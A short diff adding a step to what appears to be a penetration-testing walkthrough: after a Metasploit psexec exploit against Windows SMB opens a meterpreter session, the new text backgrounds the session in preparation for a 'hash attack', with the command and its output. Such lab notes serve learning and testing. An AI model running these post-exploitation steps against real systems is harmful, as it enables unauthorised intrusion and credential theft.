@@ -110,3 +110,11 @@ msf6 exploit(windows/smb/psexec) > exploit
 meterpreter > 
 ```
 
+Now we need to do a hash attack so background this session
+
+```shell
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > 
+```
+
